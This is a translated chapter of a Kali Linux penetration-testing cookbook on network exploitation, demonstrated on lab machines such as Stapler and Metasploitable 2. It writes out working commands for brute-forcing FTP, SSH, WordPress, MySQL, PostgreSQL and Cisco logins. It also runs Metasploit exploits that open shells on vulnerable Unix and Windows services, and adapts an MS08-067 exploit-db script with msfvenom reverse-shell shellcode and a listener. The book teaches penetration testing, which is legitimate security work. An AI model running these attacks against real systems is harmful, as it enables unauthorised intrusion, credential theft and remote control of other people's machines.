# Kali Linux 入侵和利用秘籍（二）

> 原文：[`annas-archive.org/md5/38D0D8F444F88ADA9AC2256055C3F399`](https://annas-archive.org/md5/38D0D8F444F88ADA9AC2256055C3F399)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：网络利用

在本章中，我们将涵盖以下内容：

+   收集凭证破解的信息

+   使用自定义字典破解 FTP

+   使用自定义字典破解 SSH

+   使用自定义字典破解 HTTP

+   使用自定义字典破解 MySql 和 PostgreSQL

+   使用自定义字典破解 Cisco 登录

+   利用易受攻击的服务（Unix）

+   利用易受攻击的服务（Windows）

+   使用`exploit-db`脚本来利用服务

# 介绍

在上一章中，我们枚举了开放端口并搜索可能的漏洞。在本章中，我们将对网络上的系统进行渗透测试。为了演示目的，我们选择了一个名为**Stapler**的易受攻击的操作系统，由 g0tmi1k 制作。Stapler 可以在[`www.vulnhub.com/entry/stapler-1,150/`](https://www.vulnhub.com/entry/stapler-1,150/)下载。

除了 Stapler，我们还将简要介绍如何利用 Metasploitable 2 进行利用，这在上一章中已经简要介绍过。本章的目的是向读者介绍一些网络级攻击向量，并演示不同类型的攻击。让我们开始使用 Stapler，一个易受攻击的操作系统虚拟机，通过在虚拟机上加载镜像来开始。

# 收集凭证破解的信息

为了成功进行凭证破解，有可能用户名和密码列表是很重要的。其中一种可能的方式是利用 Kali Linux Distro 中可用的字典。这些位于`/usr/share/wordlists/`下。以下屏幕截图显示了 Kali 中可用的字典：

![收集凭证破解的信息](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_001.jpg)

您将找到一个名为`rockyou.txt.gz`的文件，您需要解压缩。在终端中使用以下命令解压缩文件的内容：

```
gunzip rockyou.txt.gz

```

一旦完成，文件将被提取，如前面的屏幕截图所示。这是 Kali Linux 中可用密码的预构建列表。让我们开始利用枚举和信息收集来制定我们自己的密码之一。

## 准备工作

首先，我们将找到托管 Stapler 机器的 IP 地址，并开始枚举信息以收集和创建一组自定义密码。

## 如何做...

该配方的步骤如下：

1.  使用以下命令在子网上发现 Stapler 的 IP 地址：

```
nbtscan (x.x.x.1-255)

```

输出如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_002.jpg)

1.  运行快速的`nmap`扫描以查找可用端口：

```
nmap -sT -T4 -sV -p 1-65535 <IP address>

```

输出如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_003.jpg)

1.  连接到开放端口并收集有价值的信息；让我们枚举`ftp`、`Ssh`和`http`端口。以下是一系列收集和存储信息的方式。

**FTP 端口上的信息收集**：

我们通过输入用户名和密码`Ftp: ftp`来进入默认的匿名登录。

我们成功访问了登录并找到一个名为 note 的文件。下载后，我们得到了一些用户名。作为信息收集过程的一部分，这些用户名被存储在一个文档中。在下面的屏幕截图中可以看到相同的情况：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_004.jpg)

**SSH 上的信息收集**：

我们使用`ssh`客户端连接到 SSH，并收集信息如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_005.jpg)

我们找到了另一个可能的用户名。

**HTTP 上的信息收集**：

有很多种方式可以从 Web 应用程序中收集可能有用的单词。在 nmap 屏幕上，我们发现有一个端口`12380`，运行着一个 Web 服务器。访问并尝试检查`robots.txt`，我们发现了一些有趣的文件夹，如下屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_006.jpg)![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_007.jpg)

访问`/blogblog/` URL 时，我们发现它是一个 WordPress 网站，因此我们将尝试枚举 WordPress 博客的可能用户名。

使用以下命令枚举 WordPress 用户：

```
 wpscan -u https://<IP address>:12380/blogblog/ --enumerate u

```

输出将如下屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_008.jpg)

**通过共享进行信息收集**：

在这里，我们将收集有助于建立潜在凭证列表的信息。让我们看看这是如何可能的。我们将在机器上运行`enum4linux`，使用以下命令：

```
enum4linux <IP address>

```

输出将如下屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_009.jpg)

通过`enum4linux`进行共享枚举看起来与下面的屏幕截图类似：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_010.jpg)

这样做后，我们意识到有更多的用户名可用，因此，我们可以将它们添加到我们的用户名列表中。在进一步评估中，我们击中了大奖：服务器上可用的用户名。通过`enum4linux`进行 SID 枚举看起来与下面的屏幕截图类似：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_011.jpg)

+   现在，一个完整的用户名列表被制定并存储在用户名文件中，如下面的屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_012-min.jpg)

让我们对 Metasploitable 2 机器做同样的操作。在我们的测试实验室中，Metasploitable 2 机器托管在`192.168.157.152`。我们已经创建了一个自定义的`grep`，它将枚举用户的共享，并且只给出用户名作为输出：

```
enum4linux <IP address> | grep "user:" |cut -d "[" -f2 | cut           -d "]" -f1

```

输出将如下屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_013.jpg)

完成后，将用户名保存在任何名称的文件中。在这种情况下，我们将其命名为`metasploit_users`。这可以通过使用以下命令重定向前面命令的输出来完成：

```
enum4linux <IP address> | grep "user:" |cut -d "[  " -f2 |           cut -d "]  " -f1 > metasploit_users

```

有了这个，我们已经完成了信息收集的第一个步骤，以建立一个可信的凭证字典。在下一个步骤中，我们将看看如何利用这一点来攻击并尝试访问服务器。

# 使用自定义单词列表破解 FTP 登录

在这个步骤中，我们将学习如何攻击 FTP 以找到有效的登录。我们将使用前面信息收集步骤中生成的列表。

## 准备工作

对于这个步骤，我们将使用一个名为 Hydra 的工具。它是一个支持多种攻击协议的并行化登录破解器。Kali Linux 中有许多用于破解密码的工具；然而，Hydra 非常方便。现在我们有了 Hydra 和用户名列表，让我们开始攻击。

## 如何做...

1.  知道我们的用户名列表叫做`username`，确保终端指向用户名文件所在的路径。我们将在终端中运行以下命令：

```
hydra -e nsr -L username <IP address> ftp

```

输出将如下屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_014.jpg)

1.  检查接收到的凭证是否有效：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_015.jpg)

我们连接到 FTP，如下面的屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_016.jpg)

我们已成功找到有效的凭证，并获得了服务器潜在用户的登录信息。

## 它是如何工作的...

正如你所看到的，我们在 Hydra 中使用了以下命令：

```
hydra -e nsr -L username <IP address> ftp 

```

让我们了解带有所有开关的脚本。`-e`开关有三个选项，`n`、`s`和`r`：

+   `n`：此选项检查空密码

+   `s`：此选项用于登录名作为密码

+   `r`：这是登录名的反向作为密码

`-L`检查是用来指定用户名列表的，`ftp`是指定的协议，应该对密码进行猜测攻击。

## 还有更多...

还有更多参数可以在不同类型的攻击场景中使用。以下是一些示例：

+   `-S`：用于通过 SSL 连接到端口

+   `-s`：用于指定要测试的协议的自定义端口，如果不是默认端口

+   -p：用于尝试特定密码

+   `-P`：用于指定密码文件列表

+   `-C`：这是一个以冒号分隔的文件；在这里，用户名和密码列表可以以冒号分隔的格式，例如，`user:pass`

如果您希望将用户名和密码存储在文件中而不是在终端中显示，可以使用`-o`选项，然后指定文件名，以输出内容。

# 使用自定义单词列表破解 SSH 登录

在这个教程中，我们将学习如何攻击 SSH 以找到有效的登录。我们将使用信息收集教程中生成的列表。

## 准备工作

对于这个教程，我们将使用三个工具，Hydra、Patator 和 Ncrack 来进行 SSH 密码破解。所有这些工具都可以在 Kali Linux 中找到。

正如 Patator Wiki 中所述，Patator 是出于对使用 Hydra、Medusa、Ncrack、Metasploit 模块和 Nmap NSE 脚本进行猜密码攻击的沮丧而编写的。所有者选择了不同的方法，以避免创建另一个密码破解工具并重复相同的缺点。Patator 是一个用 Python 编写的多线程工具，旨在比其前身更可靠和灵活。

关于 Ncrack 的一些信息：Ncrack 是一个高速网络认证破解工具。Ncrack 采用模块化方法设计，命令行语法类似于 Nmap，并且可以根据网络反馈调整其行为的动态引擎。它允许对多个主机进行快速而可靠的大规模审计。它支持大多数知名协议。

## 如何操作...

1.  我们将使用 Hydra 来破解 Stapler 上 SSH 服务的密码。在终端中输入以下命令：

```
hydra -e nsr -L username <IP address> ssh -t 4

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_017.jpg)

1.  也可以使用 Patator 进行检查；在终端中输入以下命令：

```
 patator ssh_login host=<IP address> user=SHayslett
password-FILE0 0=username

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_018.jpg)

1.  让我们验证一下找到的登录是否正确。我们已经成功登录，如下截屏所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_019.jpg)

1.  我们可以尝试使用从 Metasploitable 2 获得的用户；这次我们将使用`ncrack`命令来破解密码。让我们尝试找到`sys`账户的登录。在终端中输入以下命令，对我们的 Metasploitable 2 机器上的`sys`执行 SSH 密码破解攻击：

```
ncrack -v --user sys -P /usr/share/wordlists/rockyou.txt       ssh://<IP address>

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_020.jpg)

1.  如您所见，`sys`账户的密码已经被找到，登录成功：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_021.jpg)

## 工作原理...

我们使用了以下命令：

```
hydra -e nsr -L username <IP address> ssh -t 4
patator ssh_login host=<IP address> user=SHayslett password-FILE0     0=username
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 <IP     address> ssh

```

让我们了解这些开关实际上是做什么的。

如前所述，`-e`开关有三个选项，`n`、`s`和`r`：

+   `n`：此选项检查空密码

+   `s`：这使用登录名作为密码

+   `r`：这是将登录名作为密码的反向

`-L`检查允许我们指定包含用户名的文件。`-t`开关代表任务；它并行运行连接的数量。默认情况下，数量为 16。这类似于线程概念，通过并行化获得更好的性能。`-l`开关代表特定的用户名，`-P`开关代表要读取的攻击文件列表。

让我们看看 Patator 脚本：

+   `ssh_login`：这是 Patator 的攻击向量

+   `host=`：这代表要使用的 IP 地址/URL

+   `user=`：这是用于攻击目的的用户名

+   `password=`：这是用于暴力攻击的密码文件

让我们看看 Ncrack 脚本：

+   `-v`：这个开关启用详细模式

+   `--user`：这个开关使我们能够提供用户名

+   `-P`：这是提供密码文件的开关

## 还有更多...

Patator 和 Ncrack 中有许多开关。我们建议您研究不同的协议和功能，并在我们在书中提到的易受攻击的机器上尝试它们。或者，更多信息可以在[`www.vulnhub.com/`](https://www.vulnhub.com/)找到。

# 使用自定义字典破解 HTTP 登录

我们看到 Stapler 在端口`12380`上运行了一个 Web 应用程序，其中托管了 WordPress。在这个教程中，我们将学习如何对 WordPress 的登录面板执行密码破解攻击。在这种情况下，我们将使用的工具是 WPScan。

## 准备工作

WPScan 是一个 WordPress 扫描器。它有许多功能，比如枚举 WordPress 版本、有漏洞的插件、列出可用的插件、基于字典的密码破解。

## 操作步骤...

1.  我们将首先使用枚举用户脚本枚举可用的 WordPress 登录。在终端中输入以下命令：

```
wpscan -u https://<IP address>:12380/blogblog/ --enumerate u

```

输出将如下截屏所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_022.jpg)

1.  要开始破解密码，我们将从 Kali 中提供的可用字典中提供 wordlist 文件，例如`rockyou.txt`。在终端中输入以下命令：

```
wpscan -u https://<IP address>:12380/blogblog/ --wordlist        /usr/share/wordlists/rockyou.txt  --threads 50

```

输出将如下截屏所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_023.jpg)

1.  让我们检查密码是否有效。访问登录页面：

```
https://x.x.x.x:12380/blogblog/wp-login.php

```

输出将如下截屏所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_024.jpg)

## 它是如何工作的...

让我们了解前面命令中使用的开关：

+   `-u`：此开关指定要访问的 URL

+   `--wordlist`：此开关指定要用于破解的字典或密码列表

+   `--threads`：此开关指定要加载的线程数，以通过并行作业执行实现性能

## 还有更多...

WPScan 具有相当多的功能。它允许用户枚举安装的主题、插件、用户、timthumbs 等。在 WordPress 安装中使用其他可用命令来检查它们的功能总是一个好主意。

# 使用自定义字典破解 MySql 和 PostgreSQL 登录

在这个教程中，我们将看到如何访问 MySQL 和 Postgres 数据库。我们将使用 Metasploitable 2 易受攻击的服务器来执行攻击。

## 准备工作

在这个练习中，我们将使用 Metasploit 作为我们的模块来执行凭据攻击，因为我们已经在之前的教程中看到了其他工具的工作原理。让我们启动 Metasploit 控制台并开始利用 SQL 服务器。

## 操作步骤...

1.  一旦您进入 Metasploit 控制台，输入以下命令：

```
      use auxiliary/scanner/mysql/mysql_login
      set username root
      set stop_on_success true
      set rhosts <Target IP address>
      set pass_file /usr/share/wordlists/rockyou.txt
      exploit

```

输出将如下截屏所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_025.jpg)

1.  完成后，请等待脚本完成。在这种情况下，因为我们已经给出了一个停止成功的命令，一旦找到正确的密码，它将停止执行脚本。输出将如下截屏所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_026.jpg)

1.  现在让我们尝试破解 Postgres 凭据。在 Metasploit 终端中输入以下内容：

```
      use auxiliary/scanner/postgres/postgres_login
      set rhosts <Target IP address>
      run

```

扫描器将启动，并且任何成功的尝试都将以绿色突出显示。请查看以下截屏：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_027.jpg)

## 它是如何工作的...

我们向 Metasploit 框架提供信息，包括字典路径、用户名和其他相关信息。一旦完成，我们就可以运行并导致模块执行。Metasploit 启动模块并开始暴力破解以找到正确的密码（如果在字典中可用）。让我们了解一些命令：

+   `use auxiliary/scanner/mysql/mysql_login`：在这个命令中，我们指定了将提供用户名列表的`mysql`插件

+   `set stop_on_success true`：这基本上设置了一旦找到有效密码就停止脚本的参数

+   `set pass_file /usr/share/wordlists/rockyou.txt`：在这个命令中，我们指定了脚本要引用的密码文件，以执行攻击

如果在任何时候你不知道该做什么，你可以在 Metasploit 终端中发出`show options`命令。一旦设置了`use (plugin)`命令，它将提供执行脚本所需和非必需的参数。

## 还有更多...

Metasploit 是一个丰富的框架。建议查看其他扫描器模块和为基于 SQL 的服务器破解提供的选项。

# 使用自定义单词表破解思科登录

在这个教程中，我们将看到如何访问思科设备，我们将使用 Kali 中可用的工具。我们将使用一个名为 CAT 的工具来执行这个活动。CAT 代表思科审计工具。这是一个 Perl 脚本，用于扫描思科路由器的常见漏洞。

## 准备工作

为了进行这个练习，我们已经设置了一个带有简单密码的思科设备，以演示这个活动。我们不需要任何外部工具，因为一切都在 Kali 中可用。

## 如何做...

1.  我们在`192.168.1.88`上设置了一个思科路由器。如前所述，我们将使用`CAT`：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_032.jpg)

1.  我们使用了一个自定义的用户名和密码单词表，其中包含以下详细信息：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_033.jpg)

1.  一旦你进入 Metasploit 控制台，输入以下命令：

```
 CAT -h 192.168.1.88 -w /root/Desktop/cisco_users -a
/root/Desktop/cisco_pass

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_034.jpg)

1.  正如你所看到的，它攻击服务以检查有效凭据，并且如果在单词列表中找到有效密码，则获取它。

## 工作原理...

我们使用了以下命令：

+   `-h`：这个命令告诉脚本设备的主机 IP

+   `-w`：这个命令告诉脚本要使用的用户列表来进行攻击

+   `-a`：这个命令告诉脚本要使用的密码列表来进行攻击

## 还有更多...

还有其他功能，比如`-i`，`-l`和`-q`，读者可以将其作为这个教程的练习来应用到思科设备上。

# 利用易受攻击的服务（Unix）

在这个教程中，我们将利用网络层的漏洞。这些漏洞是软件级别的漏洞。当我们谈论软件时，我们明确指的是使用网络/端口来运行的软件/包。例如，FTP 服务器，SSH 服务器，HTTP 等。这个教程将涵盖两种风格的一些漏洞，Unix 和 Windows。让我们从 UNIX 利用开始。

## 准备工作

我们将在这个模块中使用 Metasploit；确保在初始化 Metasploit 之前启动 PostgreSQL。我们将快速回顾一下我们在执行漏洞扫描时在 Metasploitable2 中发现的漏洞：

### 注意

IP 不同，因为作者已经更改了内部网络的 VLAN。

漏洞扫描输出将如下所示：

![准备工作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_028.jpg)

这个教程的先决条件是要知道你的 IP 地址，因为它将用于在 Metasploit 中设置 Lhost。让我们从这里选取一些漏洞，以了解易受攻击服务的利用是如何发生的。

## 如何做...

1.  启动 PostgreSQL，然后启动`msfconsole`：

```
      service postgresql start
      msfconsole

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_029.jpg)

1.  我们将利用`vsftpd`漏洞。在运行`msfconsole`的终端中输入以下内容：

```
      search vsftpd
      use exploit/unix/ftp/vsftpd_234_backdoor
      set rhost <Target IP Address>
      set payload cmd/unix/interact
      set lhost <Your IP Address>
      exploit

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_030.jpg)

1.  利用成功运行，并且我们已经进入了系统的根目录。让我们来看看我们在对 Metasploitable 2 进行漏洞评估扫描时发现的另一个漏洞。在终端中输入以下命令：

```
      search distcc
      use exploit/unix/misc/distcc_exec
      set payload cmd/unix/bind_perl
      set rhost <Target IP address>
      exploit

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_031.jpg)

## 工作原理...

Metasploit 是一个提供了很多功能的框架，从枚举、利用到帮助编写利用。我们上面看到的是 Metasploit 利用的一个示例。让我们了解一下在前面的`vsftpd`场景中发生了什么：

+   搜索 vsftpd：这将在 Metasploit 数据库中搜索与`vsftpd`相关的任何信息

+   `use (exploit)`: 这指定了我们想要准备执行的利用

+   `set lhost`: 这将设置我们机器的本地主机 IP 以获取一个反向 shell

+   `set rhost`: 这将设置目标 IP 以启动利用

+   `set payload (payload path)`: 这指定了在成功完成利用后我们想要执行的操作

## 还有更多...

Metasploit 还提供了社区版的图形界面版本。建议查看一下。可以在[`www.offensive-security.com/metasploit-unleashed/`](https://www.offensive-security.com/metasploit-unleashed/)找到使用 Metasploit 的详细指南。

# 利用有漏洞的服务（Windows）

在这个步骤中，我们将利用 Windows 中的有漏洞服务。为了理解这一部分，我们有一个运行着一些有漏洞软件的 Windows 7 系统。我们将进行快速枚举，找到漏洞，并使用 Metasploit 进行利用。

## 准备工作

为了开始利用，我们需要一个有漏洞的 Windows 操作系统。获取该机器的 IP。除此之外，我们还需要在**CLI**（**命令行界面**）中初始化 Metasploit 框架。我们已经准备就绪。

## 如何操作...

1.  一旦 Windows 7 镜像被下载，运行一个`nmap`扫描以找到可用的服务。在终端中运行以下命令：

```
nmap -sT -sV -T4 -p 1-65535  <IP address>

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_035.jpg)

1.  如你所见，远程机器上运行着三个有趣的软件；它们是`Konica Minolta FTP Utility ftpd 1.00`、`Easy File Sharing HTTP Server 6.9`以及运行在`16101`和`16102`端口上的服务。通过在 Google 上查找，可以发现它正在运行`Blue Coat 身份验证和授权代理`。我们检查`exploit-db`以查看它们中是否有任何一个有漏洞：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_036.jpg)

Konica Minolta FTP 有漏洞：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_037.jpg)

Blue Coat 身份验证和授权代理（BCAAA）有漏洞：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_038.jpg)

Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可以被利用。

1.  我们将首先测试 FTP。在 Metasploit 控制台中输入以下命令开始：

```
      use exploit/windows/ftp/kmftp_utility_cwd
      set rhost <Target IP address>
      set payload windows/shell_bind_tcp
      exploit

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_039.jpg)

1.  我们成功地得到了一个 shell。现在让我们测试 Easy File Sharing HTTP Server。在 Metasploit 终端中输入以下命令：

```
      use exploit/windows/http/easyfilesharing_seh
      set rhost <Target IP address>
      set payload windows/shell_bind_tcp
      exploit

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_040.jpg)

1.  我们也成功地完成了这个：我们得到了一个 shell。现在，让我们检查最后一个软件，Blue Coat 身份验证和授权代理，看看它是否容易受到利用。在 Metasploit 终端中输入以下命令：

```
      use exploit/windows/misc/bcaaa_bof
      set rhost <Target IP address>
      set payload windows/shell_bind_tcp
      exploit

```

输出将如下截屏所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_041.jpg)

我们已成功利用了所有三个漏洞。这完成了这个步骤。

## 它是如何工作的...

我们之前已经看到了 Metasploit 如何用于利用。除了我们在之前的步骤中看到和使用的命令之外，没有使用新的命令。唯一的区别是调用`use`函数来加载给定的漏洞。

`set payload windows/shell_bind_tcp`命令是一个单一的载荷，没有涉及到多个阶段。在成功利用后，它会打开一个端口，等待连接的 shell。一旦我们发送了利用，Metasploit 就会访问打开的端口，然后我们就有了一个 shell。

## 还有更多...

有各种其他方法可以进入系统；在我们开始利用之前，确保进行适当的信息收集非常重要。有了这个，我们完成了我们的网络利用。在下一章中，我们将讨论后期利用。

# 利用 exploit-db 脚本来利用服务

在这个步骤中，我们将利用 Windows SMB 服务`ms08_067`，使用 Metasploit 框架之外的利用代码。渗透测试人员经常依赖 Metasploit 进行他们的渗透测试活动，然而，重要的是要理解这些是运行的自定义脚本，并且接受远程主机端口等动态输入。在这个步骤中，我们将看到如何调整漏洞脚本以匹配我们的目标并成功利用它。

## 准备工作

对于这个步骤，我们需要使用我们一直在测试的易受攻击的 Windows 机器，以及 Kali 机器本身提供的其余工具和脚本。

## 如何做...

1.  首先让我们看看如何使用`searchsploit`在`exploit-db`数据库中搜索`ms08-067`漏洞，使用以下命令：

```
searchsploit ms08-067

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_042.jpg)

1.  我们可以看到有一个名为“Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)”的 Python 脚本可用。现在我们读取 Python 文件的内容，文件路径是`/usr/share/exploitdb/platforms/windows/remote/40279.py`。在桌面上复制一份相同的文件。![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_043.jpg)

1.  在阅读文件时，发现脚本使用了一个连接到不同 IP 和端口的自定义有效载荷：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_044.jpg)

1.  所以我们必须首先编辑代码，并将我们想要执行的有效载荷指向我们的 IP 地址和端口。为了做到这一点，我们将使用`msfvenom`创建我们的有效载荷，以便我们可以让这个脚本执行。在 Kali 终端上输入以下命令，为 Kali IP 创建一个用于反向连接的 Python shell 代码：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali IP
Address> LPORT=443 EXITFUNC=thread -b "x00x0ax0dx5cx5fx2f
x2ex40" -f python -a x86

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_045.jpg)

1.  请注意，生成的有效载荷为 380 字节。复制生成的整个`buf`行，并将其粘贴到一个文件中，将单词`buf`重命名为`shellcode`，因为我们使用的脚本使用单词`shellcode`进行有效载荷传递。文本文件看起来像这样：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_046.jpg)

请注意我们已经删除了第一行，`buf = ""`。

现在我们需要非常小心：在 Python 脚本中提到他们的有效载荷大小为 380 字节，其余部分已填充 nops 以调整传递。我们必须确保相同，所以如果有 10 个 nops 和 380 字节的代码，我们假设有 390 字节的传递，所以如果我们生成的 shell 代码是 385 字节，我们只会添加 5 个 nops 以保持我们的缓冲区恒定。在目前的情况下，新的有效载荷大小也是 380，所以我们不需要处理 NOP。现在我们将用我们创建的新 shell 代码替换原始 shell 代码。因此，用新生成的 shell 代码替换以下突出显示的文本：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_047.jpg)

请注意，我们已经在`/x90` NOP 代码之后替换了整个 shell 代码。

1.  一旦代码被替换，保存并关闭文件。启动 Metasploit，并输入以下命令，在 Kali 机器上的端口`443`上启动监听器，就像我们创建有效载荷时提到的那样：

```
      msfconsole
      use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lhost <Kali IP address>
      set lport 443
      exploit

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_048.jpg)

1.  现在，一旦我们的处理程序启动，我们将执行 Python 脚本，并提到目标 IP 地址和操作系统。转到已编辑文件被复制的桌面，并执行 Python 文件。由于它存储在桌面上，执行以下命令：

```
python 40279.py 192.168.1.11.1

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_049.jpg)

1.  一旦脚本执行完毕，请返回监听器，查看是否已收到连接：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_04_050.jpg)

太棒了，我们使用 `exploit-db` 上可用的脚本获得了远程 shell。

## 工作原理...

其中大部分已在步行说明中解释。这里介绍的新工具是 `msfvenom`。以下是所使用参数的解释：

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.3
LPORT=443 EXITFUNC=thread -b "x00x0ax0dx5cx5fx2fx2ex40"
-f python -a x86

```

+   `-p`：这是需要创建的 payload。

+   `LHOST`：主机，机器应连接到以进行利用。

+   `LPORT`：机器应连接到的端口以进行利用。

+   `-b`：这代表坏字符。它告诉脚本在生成 shell code 时避免使用所述字符。

+   `-f`：这说明了要创建的 shell code 的格式。

+   `-a`：这说明了目标机器的架构，利用将在其上执行。

## 还有更多...

这只是对如何编辑脚本以满足我们需求进行执行的基本理解。此活动旨在向读者介绍 shell code 替换的概念。`exploit-db` 上有许多与各种利用相关的脚本。


# 第五章：Web 应用程序信息收集

在本章中，我们将涵盖以下内容：

+   为 recon-ng 设置 API 秘钥

+   使用 recon-ng 进行侦察

+   使用 theharvester 收集信息

+   使用 DNS 协议进行信息收集

+   Web 应用程序防火墙检测

+   HTTP 和 DNS 负载均衡器检测

+   使用 DirBuster 发现隐藏的文件/目录

+   使用 WhatWeb 和 p0f 检测 CMS 和插件

+   查找 SSL 密码漏洞

# 介绍

攻击的一个最重要的阶段是信息收集。

为了能够发动成功的攻击，我们需要尽可能多地收集关于目标的信息。因此，我们获得的信息越多，成功攻击的可能性就越高。

同样重要的是，不仅收集信息，而且以清晰的方式记录信息也非常重要。Kali Linux 发行版有几个工具，可以从各种目标机器中记录、整理和组织信息，从而实现更好的侦察。诸如**Dradis**、**CaseFile**和**KeepNote**之类的工具就是其中的一些例子。

# 为 recon-ng 设置 API 秘钥

